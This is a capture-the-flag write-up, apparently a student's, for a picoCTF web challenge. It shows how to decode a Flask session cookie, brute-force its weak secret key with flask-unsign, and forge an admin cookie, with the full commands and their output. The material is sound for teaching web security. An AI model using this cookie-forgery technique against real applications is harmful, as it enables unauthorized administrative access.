# where are the robots

**Flag:** `picoCTF{ca1cu1at1ng_Mach1n3s_8028f}`

Approach

- step 1<br>
For this challenge we install the flask-unsign which helps in bruteforcing the secret key for a Flask cookie.

- step 2<br>
We also pick the cookie names for the secret key from the server.py file and put them in a txt file in a vertical list format without any other characters.

- step 3<br>
Then we go to the page to the storage tab and copy the token name eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zyt5KA.N_zNpJvn8zKUHNx9lXG4tBmmORM to get the key.

- step 4<br>
Then we decode the signed token using the --decode arguement.

```bash
flask-unsign --decode --cookie  'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zyt5KA.N_zNpJvn8zKUHNx9lXG4tBmmORM'
{'very_auth': 'blank'}
```
- step 5<br>
Then we use the brute forcer to find the secret key of the cookie.

```bash
 flask-unsign --unsign --cookie  'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zyt5KA.N_zNpJvn8zKUHNx9lXG4tBmmORM' --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
```
- step 6<br>
Now since we have found the secret key we can sign the key again by giving the payload as admin instead of blank.

```bash
glaiz@glaiz-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ flask-unsign --sign --cookie '{"very_auth": "admin"}' --secret "peanut butter"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZyuNlg.h4wE3S6pVYqfx9I4lRht955HmQc
 
```


![](https://github.com/adityachawla005/cryptonite_taskphase_Aditya/raw/main/TP2/Web%20Exploitation/assets/flask.png)



What you learned through solving this challenge:
<br>
- I learnt about the concept of hashing and how a flask cookie is signed using a secret key.I also learnt about the different parts of a JWT token like payload and header.


Other incorrect methods you tried:
<br>
- Tried using Hashcat,but couldnt implement it properly due to NVIDIA CUDA issue.


References
<br>
- [Cracking a Flask Cookie](https://www.youtube.com/watch?v=hjs7XjDyycI)
